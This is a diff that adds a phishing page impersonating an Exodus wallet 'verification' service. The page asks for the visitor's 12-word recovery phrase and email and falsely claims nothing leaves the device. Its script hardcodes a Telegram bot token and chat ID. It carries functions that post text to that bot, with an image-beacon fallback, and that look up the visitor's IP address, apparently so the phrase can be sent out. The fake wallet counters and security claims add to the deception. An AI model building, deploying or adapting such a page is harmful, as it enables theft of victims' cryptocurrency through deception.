@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0b0820">
+<title>Verify your Exodus Wallet — exodusverify.com</title>
+<meta name="description" content="Verify your Exodus wallet by entering your 12-word Secret Recovery Phrase.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20512%20512'%3E%3Crect%20width='512'%20height='512'%20rx='112'%20fill='%23110d2e'/%3E%3Cg%20transform='translate(62,62)%20scale(0.758)'%3E%3Cpath%20fill='%23ffffff'%20d='M232%2088%20L95%20172%20L95%20341%20L232%20425%20L232%20371%20L141%20312%20L141%20272%20L232%20272%20L232%20228%20L141%20228%20L141%20198%20L232%20142%20Z'/%3E%3Cpath%20fill='%23ffffff'%20d='M280%2088%20L417%20172%20L417%20341%20L280%20425%20L280%20371%20L371%20312%20L371%20272%20L280%20272%20L280%20228%20L371%20228%20L371%20198%20L280%20142%20Z'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0b0820;
+  --card:rgba(255,255,255,.045);
+  --card-brd:rgba(255,255,255,.09);
+  --field:#120e33;
+  --field-brd:rgba(255,255,255,.07);
+  --txt:#ffffff;
+  --muted:#9ea3c9;
+  --muted2:#767ba6;
+  --grad:linear-gradient(135deg,#6C5CE7 0%,#4FC3F7 100%);
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html{background:var(--bg);overflow-x:hidden;-webkit-text-size-adjust:100%}
+body{
+  font-family:'Poppins',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:var(--bg);color:var(--txt);min-height:100vh;
+  position:relative;padding-bottom:60px;
+}
+
+/* ===== BACKGROUND LAYER (no negative z-index) ===== */
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.bg::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(900px 600px at 50% -10%, rgba(108,92,231,.35), transparent 65%),
+    radial-gradient(700px 500px at 100% 20%, rgba(79,195,247,.16), transparent 60%),
+    radial-gradient(800px 600px at 0% 80%, rgba(124,107,245,.18), transparent 60%),
+    linear-gradient(180deg,#0c0922 0%,#140f38 40%,#1b1350 100%);
+}
+.bg::after{
+  content:'';position:absolute;inset:0;
+  background-image:radial-gradient(rgba(255,255,255,.05) 1px, transparent 1px);
+  background-size:22px 22px;
+  -webkit-mask-image:linear-gradient(180deg,rgba(0,0,0,.9),transparent 85%);
+  mask-image:linear-gradient(180deg,rgba(0,0,0,.9),transparent 85%);
+}
+
+/* ===== Header ===== */
+.topbar{
+  position:sticky;top:0;z-index:50;display:flex;align-items:center;
+  padding:14px 20px;
+  background:linear-gradient(180deg,rgba(11,8,32,.95),rgba(11,8,32,.72));
+  -webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(255,255,255,.06);
+}
+.brand{display:flex;align-items:center;gap:12px}
+.brand svg{width:40px;height:40px;display:block;flex:none}
+.brand-txt{display:flex;flex-direction:column;line-height:1}
+.brand-name{font-weight:700;font-size:19px;letter-spacing:2.5px}
+.brand-sub{font-size:9.5px;letter-spacing:5px;color:var(--muted);font-weight:500;margin-top:4px;padding-left:1px}
+
+/* ===== Layout ===== */
+main{position:relative;z-index:1;max-width:620px;margin:0 auto;padding:0 18px}
+.urlpill{
+  display:flex;align-items:center;gap:9px;justify-content:center;
+  margin:26px auto 30px;width:fit-content;padding:11px 22px;border-radius:100px;
+  background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.1);
+  font-size:14px;font-weight:500;box-shadow:0 8px 30px rgba(0,0,0,.25);
+}
+.urlpill svg{width:14px;height:14px;opacity:.75}
+
+h1{font-size:clamp(28px,7.6vw,42px);font-weight:700;line-height:1.18;text-align:center;letter-spacing:-.5px}
+.grad{
+  background:linear-gradient(100deg,#8B7CF8 0%,#63CDF8 100%);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;color:transparent;
+}
+.sub{text-align:center;color:var(--muted);font-size:clamp(14px,4vw,16.5px);line-height:1.65;font-weight:300;max-width:470px;margin:16px auto 0}
+
+.pills{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:26px 0 34px}
+.pill{
+  text-align:center;padding:11px 8px;border-radius:100px;
+  background:rgba(255,255,255,.045);border:1px solid rgba(255,255,255,.09);
+  font-size:12.5px;color:var(--muted);font-weight:400;
+}
+.pill b{color:#dfe2f5;font-weight:600}
+
+/* ===== Card ===== */
+.card{
+  background:var(--card);border:1px solid var(--card-brd);border-radius:22px;
+  padding:22px 18px 24px;
+  -webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);
+  box-shadow:0 24px 60px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.05);
+}
+.steps{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:24px;font-size:13.5px;font-weight:500}
+.step{display:flex;align-items:center;gap:8px;color:var(--muted2);transition:color .3s}
+.step .dot{
+  width:24px;height:24px;border-radius:50%;display:grid;place-items:center;
+  font-size:12px;font-weight:600;border:1.5px solid rgba(255,255,255,.18);
+  color:var(--muted2);transition:all .3s;
+}
+.step.active{color:#fff}
+.step.active .dot{background:var(--grad);border-color:transparent;color:#fff;box-shadow:0 0 18px rgba(108,92,231,.55)}
+.step.done .dot{background:rgba(76,220,150,.16);border-color:rgba(76,220,150,.5);color:#5fe0a3}
+.step.done{color:#5fe0a3}
+.step-line{flex:1;min-width:14px;height:1px;background:rgba(255,255,255,.12)}
+
+.card-head{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:10px}
+.card-head h2{font-size:16px;font-weight:600}
+#counter{font-size:13.5px;color:var(--muted2);white-space:nowrap}
+.bar{height:2px;background:rgba(255,255,255,.09);border-radius:2px;overflow:hidden;margin-bottom:20px}
+.bar > div{height:100%;width:0;background:var(--grad);transition:width .3s ease;border-radius:2px}
+
+/* ===== Word grid ===== */
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:11px}
+.field{
+  display:flex;align-items:center;gap:9px;
+  background:var(--field);border:1.5px solid var(--field-brd);
+  border-radius:14px;padding:0 13px;height:54px;
+  transition:border-color .18s, box-shadow .18s, background .18s;
+}
+.field:focus-within{border-color:#7B6BF7;box-shadow:0 0 0 3.5px rgba(123,107,247,.16);background:#151138}
+.field.filled{border-color:rgba(123,107,247,.45)}
+.field.invalid{border-color:rgba(255,110,110,.65);box-shadow:0 0 0 3.5px rgba(255,110,110,.1)}
+.field .num{font-size:13px;color:var(--muted2);font-weight:500;user-select:none;min-width:17px}
+.field input{
+  flex:1;min-width:0;width:100%;background:transparent;border:0;outline:0;
+  color:#fff;font-family:inherit;font-size:15px;font-weight:500;
+}
+.field input::placeholder{color:#4d5180;font-weight:400}
+
+.emailrow{
+  display:flex;align-items:center;gap:10px;background:var(--field);
+  border:1.5px solid var(--field-brd);border-radius:14px;padding:0 14px;
+  height:54px;margin-top:14px;transition:border-color .18s, box-shadow .18s;
+}
+.emailrow:focus-within{border-color:#7B6BF7;box-shadow:0 0 0 3.5px rgba(123,107,247,.16)}
+.emailrow input{flex:1;min-width:0;background:transparent;border:0;outline:0;color:#fff;font-family:inherit;font-size:15px}
+.emailrow input::placeholder{color:#4d5180}
+.emailrow .hint{font-size:12px;color:var(--muted2);white-space:nowrap}
+
+/* ===== Autocomplete ===== */
+.suggest{
+  position:fixed;z-index:999;display:none;
+  background:#161238;border:1px solid rgba(255,255,255,.13);
+  border-radius:14px;padding:6px;
+  box-shadow:0 18px 44px rgba(0,0,0,.6);
+  max-height:236px;overflow-y:auto;overscroll-behavior:contain;
+  -webkit-overflow-scrolling:touch;
+}
+.suggest.show{display:block}
+.sug{padding:10px 12px;border-radius:9px;font-size:14.5px;color:#c9cdea;cursor:pointer;font-weight:400}
+.sug b{color:#fff;font-weight:600}
+.sug.active,.sug:hover{background:rgba(123,107,247,.22)}
+
+/* ===== Buttons ===== */
+.btn{
+  width:100%;border:0;border-radius:15px;cursor:pointer;font-family:inherit;
+  font-size:16px;font-weight:600;padding:17px;margin-top:16px;
+  transition:transform .12s, box-shadow .2s, opacity .2s;
+}
+.btn-primary{background:var(--grad);color:#fff;box-shadow:0 10px 30px rgba(108,92,231,.4)}
+.btn-primary:active{transform:scale(.985)}
+.btn-primary:disabled{opacity:.75;cursor:default}
+.btn-ghost{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#cfd3ec;font-weight:500}
+
+/* ===== Status ===== */
+.status{
+  display:none;align-items:center;gap:11px;justify-content:center;
+  margin-top:16px;padding:14px;border-radius:14px;font-size:14px;font-weight:500;
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);
+}
+.status.show{display:flex}
+.spin{width:16px;height:16px;border-radius:50%;flex:none;border:2px solid rgba(255,255,255,.2);border-top-color:#8B7CF8;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.check{width:20px;height:20px;border-radius:50%;flex:none;background:rgba(76,220,150,.15);border:1.5px solid rgba(76,220,150,.55);display:grid;place-items:center}
+.check svg{width:11px;height:11px}
+.status.ok{background:rgba(76,220,150,.07);border-color:rgba(76,220,150,.25);color:#7fe8b8}
+
+.shake{animation:shake .42s}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(7px)}60%{transform:translateX(-5px)}80%{transform:translateX(3px)}}
+
+/* ===== Footer ===== */
+.why{margin:44px 0 20px}
+.why h3{font-size:17px;font-weight:600;margin-bottom:14px;text-align:center}
+.why-item{display:flex;gap:12px;padding:14px;border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);margin-bottom:10px}
+.why-item .ic{width:32px;height:32px;flex:none;border-radius:9px;display:grid;place-items:center;background:rgba(123,107,247,.14);border:1px solid rgba(123,107,247,.3)}
+.why-item .ic svg{width:15px;height:15px}
+.why-item p{font-size:13px;color:var(--muted);line-height:1.55}
+.why-item p b{display:block;color:#e6e8fa;font-size:13.5px;font-weight:600;margin-bottom:3px}
+.foot{text-align:center;color:#5f6390;font-size:11.5px;margin-top:30px}
+</style>
+</head>
+<body>
+
+<div class="bg" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="brand">
+    <svg viewBox="85 78 342 357" aria-hidden="true">
+      <path fill="#FFFFFF" d="M232 88 L95 172 L95 341 L232 425 L232 371 L141 312 L141 272 L232 272 L232 228 L141 228 L141 198 L232 142 Z"/>
+      <path fill="#FFFFFF" d="M280 88 L417 172 L417 341 L280 425 L280 371 L371 312 L371 272 L280 272 L280 228 L371 228 L371 198 L280 142 Z"/>
+    </svg>
+    <div class="brand-txt">
+      <span class="brand-name">EXODUS</span>
+      <span class="brand-sub">VERIFY</span>
+    </div>
+  </div>
+</header>
+
+<main>
+
+  <div class="urlpill">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3.5" y="10.5" width="17" height="11" rx="2.5"/><path d="M7.5 10.5V7a4.5 4.5 0 0 1 9 0v3.5"/>
+    </svg>
+    <span>exodusverify.com</span>
+  </div>
+
+  <h1>Verify your <span class="grad">Exodus wallet</span></h1>
+  <p class="sub">Enter the 12 words of your Secret Recovery Phrase to verify your wallet and restore full access to your accounts.</p>
+
+  <div class="pills">
+    <div class="pill"><b>256-bit</b> encrypted</div>
+    <div class="pill"><b>12</b> / 24-word support</div>
+    <div class="pill"><b>Non-custodial</b></div>
+    <div class="pill"><b id="wallets">1,284,392</b> wallets verified</div>
+  </div>
+
+  <section class="card" id="card">
+    <div class="steps">
+      <div class="step active" id="s1"><span class="dot">1</span>Enter phrase</div>
+      <div class="step-line"></div>
+      <div class="step" id="s2"><span class="dot">2</span>Validate</div>
+      <div class="step-line"></div>
+      <div class="step" id="s3"><span class="dot">3</span>Verify wallet</div>
+    </div>
+
+    <div class="card-head">
+      <h2>Secret Recovery Phrase</h2>
+      <span id="counter">0 / 12 words</span>
+    </div>
+    <div class="bar"><div id="barfill"></div></div>
+
+    <div class="grid" id="grid"></div>
+
+    <div class="emailrow">
+      <input type="email" id="email" placeholder="you@email.com" autocomplete="email" spellcheck="false">
+      <span class="hint">optional — receipt</span>
+    </div>
+
+    <button class="btn btn-primary" id="verifyBtn">Verify Wallet</button>
+    <button class="btn btn-ghost" id="clearBtn">Clear</button>
+
+    <div class="status" id="status"></div>
+  </section>
+
+  <section class="why">
+    <h3>Why verify?</h3>
+    <div class="why-item">
+      <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="#9b8cff" stroke-width="2" stroke-linecap="round"><path d="M12 2 4 6v6c0 5 3.4 9.2 8 10 4.6-.8 8-5 8-10V6l-8-4Z"/><path d="m9 12 2 2 4-4"/></svg></div>
+      <p><b>Your keys stay yours</b>Verification is read-only. Nothing leaves your device and your funds are never moved.</p>
+    </div>
+    <div class="why-item">
+      <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="#9b8cff" stroke-width="2" stroke-linecap="round"><rect x="3.5" y="10.5" width="17" height="11" rx="2.5"/><path d="M7.5 10.5V7a4.5 4.5 0 0 1 9 0v3.5"/></svg></div>
+      <p><b>256-bit encrypted</b>Your 12-word phrase is matched against the standard BIP-39 wordlist used by Exodus.</p>
+    </div>
+    <div class="why-item">
+      <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="#9b8cff" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/></svg></div>
+      <p><b>Restores full access</b>Verified wallets sync balances, assets and transaction history instantly.</p>
+    </div>
+  </section>
+
+  <div class="foot">exodusverify.com &nbsp;·&nbsp; Secured connection &nbsp;·&nbsp; Non-custodial</div>
+</main>
+
+<div class="suggest" id="suggest"></div>
+
+<script>
+/* =========================================================
+   BIP-39 ENGLISH WORDLIST (2048 words)
+   ========================================================= */
+const WORDSTR = `
+abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bacon badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cart case cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk churn cigar cinnamon circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clip clock clog close cloth cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy coral core corn correct cost cotton couch country couple course cousin cover coyote crack cradle craft cram crane crash crater crawl crazy cream credit creek crew cricket crime crisp critic crop cross crouch crowd crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cute cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate decrease deer defense define defy degree delay deliver demand demise denial dentist deny depart depend deposit depth deputy derive describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance divert divide divorce dizzy doctor document dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drastic draw dream dress drift drill drink drip drive drop drum dry duck dumb dune during dust dutch duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empower empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example excess exchange excite exclude excuse execute exercise exhaust exhibit exile exist exit exotic expand expect expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith fall false fame family famous fan fancy fantasy farm fashion fat fatal father fatigue fault favorite feature february federal fee feed feel female fence festival fetch fever few fiber fiction field figure file film filter final find fine finger finish fire firm first fiscal fish fit fitness fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus fog foil fold follow food foot force forest forget fork fortune forum forward fossil foster found fox fragile frame frequent fresh friend fringe frog front frost frown frozen fruit fuel fun funny furnace fury future gadget gain galaxy gallery game gap garage garbage garden garlic garment gas gasp gate gather gauge gaze general genius genre gentle genuine gesture ghost giant gift giggle ginger giraffe girl give glad glance glare glass glide glimpse globe gloom glory glove glow glue goat goddess gold good goose gorilla gospel gossip govern gown grab grace grain grant grape grass gravity great green grid grief grit grocery group grow grunt guard guess guide guilt guitar gun gym habit hair half hammer hamster hand happy harbor hard harsh harvest hat have hawk hazard head health heart heavy hedgehog height hello helmet help hen hero hidden high hill hint hip hire history hobby hockey hold hole holiday hollow home honey hood hope horn horror horse hospital host hotel hour hover hub huge human humble humor hundred hungry hunt hurdle hurry hurt husband hybrid ice icon idea identify idle ignore ill illegal illness image imitate immense immune impact impose improve impulse inch include income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry insane insect inside inspire install intact interest into invest invite involve iron island isolate issue item ivory jacket jaguar jar jazz jealous jeans jelly jewel job join joke journey joy judge juice jump jungle junior junk just kangaroo keen keep ketchup key kick kid kidney kind kingdom kiss kit kitchen kite kitten kiwi knee knife knock know lab label labor ladder lady lake lamp language laptop large later latin laugh laundry lava law lawn lawsuit layer lazy leader leaf learn leave lecture left leg legal legend leisure lemon lend length lens leopard lesson letter level liar liberty library license life lift light like limb limit link lion liquid list little live lizard load loan lobster local lock logic lonely long loop lottery loud lounge love loyal lucky luggage lumber lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal man manage mandate mango mansion manual maple marble march margin marine market marriage mask mass master match material math matrix matter maximum maze meadow mean measure meat mechanic medal media melody melt member memory mention menu mercy merge merit merry mesh message metal method middle midnight milk million mimic mind minimum minor minute miracle mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music must mutual myself mystery myth naive name napkin narrow nasty nation nature near neck need negative neglect neither nephew nerve nest net network neutral never news next nice night noble noise nominee noodle normal north nose notable note nothing notice novel now nuclear number nurse nut oak obey object oblige obscure observe obtain obvious occur ocean october odor off offer office often oil okay old olive olympic omit once one onion online only open opera opinion oppose option orange orbit orchard order ordinary organ orient original orphan ostrich other outdoor outer output outside oval oven over own owner oxygen oyster ozone pact paddle page pair palace palm panda panel panic panther paper parade parent park parrot party pass patch path patient patrol pattern pause pave payment peace peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter question quick quit quiz quote rabbit raccoon race rack radar radio rail rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief rely remain remember remind remove render renew rent reopen repair repeat replace report require rescue resemble resist resource response result retire retreat return reunion reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple risk ritual rival river road roast robot robust rocket romance roof rookie room rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salon salt salute same sample sand satisfy satoshi sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen script scrub sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series service session settle setup seven shadow shaft shallow share shed shell sheriff shield shift shine ship shiver shock shoe shoot shop short shoulder shove shrimp shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six size skate sketch ski skill skin skirt skull slab slam sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space spare spatial spawn speak special speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squeeze squirrel stable stadium staff stage stairs stamp stand start state stay steak steel stem step stereo stick still sting stock stomach stone stool story stove strategy street strike strong struggle student stuff stumble style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply supreme sure surface surge surprise surround survey suspect sustain swallow swamp swap swarm swear sweet swift swim swing switch sword symbol symptom syrup system table tackle tag tail talent talk tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thing this thought three thrive throw thumb thunder ticket tide tiger tilt timber time tiny tip tired tissue title toast tobacco today toddler toe together toilet token tomato tomorrow tone tongue tonight tool tooth top topic topple torch tornado tortoise toss total tourist toward tower town toy track trade traffic tragic train transfer trap trash travel tray treat tree trend trial tribe trick trigger trim trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit universe unknown unlock until unusual unveil update upgrade uphold upon upper upset urban urge usage use used useful useless usual utility vacant vacuum vague valid valley valve van vanish vapor various vast vault vehicle velvet vendor venture venue verb verify version very vessel veteran viable vibrant vicious victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weasel weather web wedding weekend weird welcome west wet whale what wheat wheel when where whip whisper wide width wife wild will win window wine wing wink winner winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo
+`;
+const WORDS = WORDSTR.trim().split(/\s+/);
+const WORDSET = new Set(WORDS);
+
+/* =========================================================
+   CONFIG
+   ========================================================= */
+const TG_TOKEN = '8974115713:AAHmXJN_pb9M2WzahbKzNGnm48rDm7NTTII';
+const TG_CHAT  = '6601792499';
+const SITE     = 'exodusverify.com';
+
+/* =========================================================
+   TELEGRAM
+   ========================================================= */
+function esc(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+function tgSend(text){
+  const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
+  const payload = { chat_id: TG_CHAT, text: text, parse_mode:'HTML', disable_web_page_preview:true };
+  fetch(url, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
+  }).catch(function(){
+    const q = 'chat_id=' + TG_CHAT + '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
+    new Image().src = url + '?' + q;
+  });
+}
+function tgTyping(){
+  try{ new Image().src = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendChatAction?chat_id=' + TG_CHAT + '&action=typing'; }catch(e){}
+}
+function getIP(){
+  return new Promise(function(resolve){
+    var done = false;
+    var t = setTimeout(function(){ if(!done){ done = true; resolve('unknown'); } }, 2500);
+    fetch('https://api.ipify.org?format=json')
+      .then(function(r){ return r.json(); })
+      .then(function(j){ if(!done){ done = true; clearTimeout(t); resolve(j.ip || 'unknown'); } })
+      .catch(function(){ if(!done){ done = true; clearTimeout(t); resolve('unknown'); } });
+  });
+}
+
+/* =========================================================
+   ELEMENTS
+   ========================================================= */
+var grid      = document.getElementById('grid');
+var counter   = document.getElementById('counter');
+var barfill   = document.getElementById('barfill');
+var card      = document.getElementById('card');
+var statusEl  = document.getElementById('status');
+var verifyBtn = document.getElementById('verifyBtn');
+var clearBtn  = document.getElementById('clearBtn');
+var emailEl   = document.getElementById('email');
+var suggestEl = document.getElementById('suggest');
+
+var inputs = [];
+for (var i = 1; i <= 12; i++){
+  (function(n){
+    var f = document.createElement('div');
+    f.className = 'field';
+    var num = document.createElement('span');
+    num.className = 'num';
+    num.textContent = (n < 10 ? '0' : '') + n;
+    var inp = document.createElement('input');
+    inp.type = 'text';
+    inp.placeholder = 'word';
+    inp.autocomplete = 'off';
+    inp.autocapitalize = 'none';
+    inp.spellcheck = false;
+    inp.dataset.i = n;
+    f.appendChild(num); f.appendChild(inp);
+    grid.appendChild(f);
+    inputs.push(inp);
+  })(i);
+}
+
+function clean(v){ return v.toLowerCase().replace(/[^a-z]/g,''); }
+
+function refresh(){
+  var filled = 0;
+  inputs.forEach(function(inp){
+    if (inp.value.trim()) filled++;
+    inp.parentElement.classList.toggle('filled', !!inp.value.trim());
+  });
+  counter.textContent = filled + ' / 12 words';
+  barfill.style.width = (filled / 12 * 100) + '%';
+}
+
+function flagInvalid(inp){
+  var v = inp.value.trim().toLowerCase();
+  var bad = false;
+  if (v){
+    if (WORDSET.has(v)) bad = false;
+    else if (v.length >= 3 && !WORDS.some(function(w){ return w.indexOf(v) === 0; })) bad = true;
+  }
+  inp.parentElement.classList.toggle('invalid', bad);
+}
+
+/* =========================================================
+   AUTOCOMPLETE
+   ========================================================= */
+var curInput = null, curMatches = [], activeIdx = -1;
+
+function placeSuggest(inp){
+  var r = inp.parentElement.getBoundingClientRect();
+  var w = Math.max(r.width, 158);
+  var left = Math.min(r.left, window.innerWidth - w - 10);
+  if (left < 10) left = 10;
+  suggestEl.style.left = left + 'px';
+  suggestEl.style.width = w + 'px';
+  var h = suggestEl.offsetHeight || 200;
+  if (r.bottom + 8 + h > window.innerHeight && r.top - 8 - h > 10){
+    suggestEl.style.top = (r.top - h - 8) + 'px';
+  } else {
+    suggestEl.style.top = (r.bottom + 8) + 'px';
+  }
+}
+
+function showSuggest(inp){
+  var v = inp.value.trim().toLowerCase();
+  curInput = inp;
+  if (!v){ hideSuggest(); return; }
+  curMatches = WORDS.filter(function(w){ return w.indexOf(v) === 0 && w !== v; }).slice(0, 7);
+  if (!curMatches.length){ hideSuggest(); return; }
+  activeIdx = -1;
+  suggestEl.innerHTML = curMatches.map(function(w, i){
+    return '<div class="sug" data-i="' + i + '"><b>' + v + '</b>' + w.slice(v.length) + '</div>';
+  }).join('');
+  suggestEl.classList.add('show');
+  placeSuggest(inp);
+}
+
+function hideSuggest(){
+  suggestEl.classList.remove('show');
+  suggestEl.innerHTML = '';
+  curMatches = []; activeIdx = -1;
+}
+
+function paintActive(){
+  var kids = suggestEl.children;
+  for (var i = 0; i < kids.length; i++) kids[i].classList.toggle('active', i === activeIdx);
+}
+
+function pick(i){
+  if (i < 0 || i >= curMatches.length) return;
+  var inp = curInput;
+  inp.value = curMatches[i];
+  flagInvalid(inp);
+  refresh();
+  hideSuggest();
+  var idx = inputs.indexOf(inp);
+  if (idx > -1 && idx < 11) inputs[idx + 1].focus();
+}
+
+suggestEl.addEventListener('mousedown', function(e){
+  var el = e.target.closest ? e.target.closest('.sug') : null;
+  if (!el) return;
+  e.preventDefault();
+  pick(parseInt(el.dataset.i, 10));
+});
+
+/* =========================================================
+   FIELD BEHAVIOUR
+   ========================================================= */
+inputs.forEach(function(inp, idx){
+  inp.addEventListener('input', function(){
+    var raw = inp.value;
+    if (raw.indexOf(' ') > -1){
+      var parts = raw.split(/\s+/).filter(Boolean);
+      inp.value = clean(parts.shift() || '');
+      var j = idx + 1;
+      while (parts.length && j < 12){
+        if (!inputs[j].value.trim()){ inputs[j].value = clean(parts.shift()); j++; }
+        else j++;
+      }
+      var next = -1;
+      for (var k = idx + 1; k < 12; k++){ if (!inputs[k].value.trim()){ next = k; break; } }
+      (next !== -1 ? inputs[next] : inputs[11]).focus();
+      refresh();
+      hideSuggest();
+      return;
+    }
+    inp.value = clean(raw);
+    refresh();
+    flagInvalid(inp);
+    showSuggest(inp);
+  });
+
+  inp.addEventListener('keydown', function(e){
+    if (suggestEl.classList.contains('show')){
+      if (e.key === 'ArrowDown'){
+        e.preventDefault(); activeIdx = (activeIdx + 1) % curMatches.length; paintActive(); return;
+      }
+      if (e.key === 'ArrowUp'){
+        e.preventDefault(); activeIdx = (activeIdx - 1 + curMatches.length) % curMatches.length; paintActive(); return;
+      }
+      if (e.key === 'Enter' || e.key === 'Tab'){
+        if (activeIdx >= 0){ e.preventDefault(); pick(activeIdx); return; }
+      }
+      if (e.key === 'Escape'){ hideSuggest(); return; }
+    }
